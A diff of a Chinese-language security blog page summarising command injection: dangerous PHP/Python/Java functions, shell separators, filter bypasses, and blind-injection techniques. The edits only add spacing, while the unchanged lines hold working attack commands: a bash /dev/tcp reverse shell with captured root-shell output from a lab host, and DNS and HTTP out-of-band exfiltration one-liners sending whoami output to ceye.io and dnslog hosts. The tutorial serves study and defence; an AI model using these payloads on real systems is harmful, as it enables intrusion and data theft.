@@ -174,7 +174,11 @@
 
         <div class="article-content markdown-body">
             <h1 id="命令注入总结"><a href="#命令注入总结" class="headerlink" title="命令注入总结"></a>命令注入总结</h1><p>命令注入是通过易受攻击的应用程序在主机操作系统上执行任意命令。在此攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的权限执行。 命令注入攻击很可能主要是由于输入验证不足。此攻击与代码注入不同，因为代码注入允许攻击者添加自己的代码，然后由应用程序执行。 在命令注入中，攻击者扩展了执行系统命令的应用程序的默认功能，而无需注入代码。</p>
+<br/>
+
 <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>当应用程序将不安全的用户提供的数据（表单，cookie，HTTP标头等）不经过检查过滤就传递给系统shell时，可能会发生命令注入攻击。 </p>
+<br/>
+
 <h2 id="常见的危险函数"><a href="#常见的危险函数" class="headerlink" title="常见的危险函数"></a>常见的危险函数</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>执行 <code>command</code> 参数所指定的命令， 并且输出执行结果。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system ( <span class="keyword">string</span> <span class="variable">$command</span> , <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> = ? ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
 <p>command：要执行的命令。</p>
@@ -208,6 +212,8 @@
 <li><code>bypass_shell</code> （仅用于 Windows 平台）： 设置为 <strong><code>true</code></strong> 表示绕过 <code>cmd.exe</code> shell。</li>
 </ul>
 <h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>PHP 支持一个执行运算符：反引号(``)。PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。效果和 shell_exec() 相同。</p>
+<br/>
+
 <h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><h4 id="system-1"><a href="#system-1" class="headerlink" title="system"></a>system</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(command)</span><br></pre></td></tr></table></figure>
 <p>在子 shell 中执行命令（字符串）。在 Unix 上，返回值是进程的退出状态；在 Windows 上，返回值是运行 <em>command</em> 后系统 Shell 返回的值。</p>
 <h4 id="popen-1"><a href="#popen-1" class="headerlink" title="popen"></a>popen</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen(cmd, mode=<span class="string">&#x27;r&#x27;</span>, buffering=-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
@@ -215,7 +221,11 @@
 <h4 id="subprocess-call-subprocess-run"><a href="#subprocess-call-subprocess-run" class="headerlink" title="subprocess.call/subprocess.run"></a>subprocess.call/subprocess.run</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subprocess.call(args, *, stdin=<span class="literal">None</span>, stdout=<span class="literal">None</span>, stderr=<span class="literal">None</span>, shell=<span class="literal">False</span>, cwd=<span class="literal">None</span>, timeout=<span class="literal">None</span>, **other_popen_kwargs)</span><br></pre></td></tr></table></figure>
 <p>运行由 <em>args</em> 所描述的命令。 等待命令完成，然后返回 <code>returncode</code>属性。</p>
 <h4 id="spawn"><a href="#spawn" class="headerlink" title="spawn"></a>spawn</h4><p>创建新进程以执行命令</p>
-<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><h4 id="java-lang-Runtime-getRuntime-exec-command"><a href="#java-lang-Runtime-getRuntime-exec-command" class="headerlink" title="java.lang.Runtime.getRuntime().exec(command)"></a>java.lang.Runtime.getRuntime().exec(command)</h4><h2 id="Linux下常用的符号"><a href="#Linux下常用的符号" class="headerlink" title="Linux下常用的符号"></a>Linux下常用的符号</h2><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><table>
+<br/>
+
+<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><h4 id="java-lang-Runtime-getRuntime-exec-command"><a href="#java-lang-Runtime-getRuntime-exec-command" class="headerlink" title="java.lang.Runtime.getRuntime().exec(command)"></a>java.lang.Runtime.getRuntime().exec(command)</h4><br/>
+
+<h2 id="Linux下常用的符号"><a href="#Linux下常用的符号" class="headerlink" title="Linux下常用的符号"></a>Linux下常用的符号</h2><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><table>
 <thead>
 <tr>
 <th>符号</th>
@@ -307,6 +317,8 @@
 <td align="left">执行 history 中的命令</td>
 </tr>
 </tbody></table>
+<br/>
+
 <h2 id="常用绕过"><a href="#常用绕过" class="headerlink" title="常用绕过"></a>常用绕过</h2><h3 id="命令分隔与执行多条命令"><a href="#命令分隔与执行多条命令" class="headerlink" title="命令分隔与执行多条命令"></a>命令分隔与执行多条命令</h3><ul>
 <li>在Unix上:</li>
 </ul>
@@ -420,7 +432,11 @@
 <ul>
 <li>-t 将文件依建立时间之先后次序列出</li>
 </ul>
+<br/>
+
 <h2 id="无回显的命令注入"><a href="#无回显的命令注入" class="headerlink" title="无回显的命令注入"></a>无回显的命令注入</h2><p>我们之前提到的大部分都是有回显或者一部分提示的命令注入，当我们遇到无回显的命令注入的时候我们又要怎么办呢？</p>
+<br/>
+
 <h3 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h3><ul>
 <li>首先我们可以通过<code>sleep</code>命令根据返回的时间来判断是否存在命令执行漏洞。</li>
 </ul>
@@ -442,6 +458,8 @@
 </li>
 </ol>
 <p>这样我们就可以确定第一个字符是一个h。以此类推，我们就能将完整的主机名猜解出来。</p>
+<br/>
+
 <h3 id="DNSLog"><a href="#DNSLog" class="headerlink" title="DNSLog"></a>DNSLog</h3><p>无回显得命令执行语句可以使用DNSLog来查看结果。</p>
 <ul>
 <li>window</li>
@@ -454,15 +472,15 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 &#96;whoami&#96;.t6n089.ceye.io</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317113750098.png" alt="image-20210317113750098"></p>
 <p>都可以看到我们的用户名显示在域名的最左边</p>
+<br/>
+
 <h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><p>首先在自己的机器上开启监听端口：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>
 <p>然后在命令执行处输入：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp;/dev/tcp/ip地址/端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 <p>可以得到靶机的bash控制权：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 4444</span></span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">192.168.91.143: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.91.128] from (UNKNOWN) [192.168.91.143] 34728</span><br><span class="line">root@ubuntu18:/var/www/html<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">checksite</span><br><span class="line">DVWA-master</span><br><span class="line">index.html</span><br><span class="line">phpmyadmin</span><br><span class="line">test.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
+<br/>
 
 <h3 id="HTTP外带"><a href="#HTTP外带" class="headerlink" title="HTTP外带"></a>HTTP外带</h3><ul>
 <li>Linux</li>
@@ -475,6 +493,8 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:</span><br><span class="line">for &#x2F;F %x in (&#39;whoami&#39;) do start http:&#x2F;&#x2F;xxx.ceye.io&#x2F;%x</span><br><span class="line">dns请求：</span><br><span class="line">获取计算机名：for &#x2F;F &quot;delims&#x3D;&quot; %i in (&#39;whoami&#39;) do ping -n 1 %i.xxx.dnslog.info</span><br><span class="line">获取用户名：for &#x2F;F &quot;delims&#x3D; tokens&#x3D;2&quot; %i in (&#39;whoami&#39;) do ping -n 1 %i.xxx.dnslog.info</span><br><span class="line"></span><br><span class="line">for &#x2F;F %x in (&#39;whoami&#39;) do powershell $a&#x3D;[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(&#39;%x&#39;));$b&#x3D;New-Object System.Net.WebClient;$b.DownloadString(&#39;http:&#x2F;&#x2F;xxx.ceye.io&#x2F;&#39;+$a);</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210324205124046.png" alt="image-20210324205124046"></p>
 <p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210324205511286.png" alt="image-20210324205511286"></p>
+<br/>
+
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://myt0.com/2019/03/03/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CWAF-Filter%E7%BB%95%E8%BF%87/" >PHP命令执行时的WAF&amp;Filter绕过方法<i class="fas fa-external-link-alt"></i></a></p>
 <p><a class="link"   target="_blank" rel="noopener" href="https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" >巧用命令注入的N种方式<i class="fas fa-external-link-alt"></i></a></p>
 
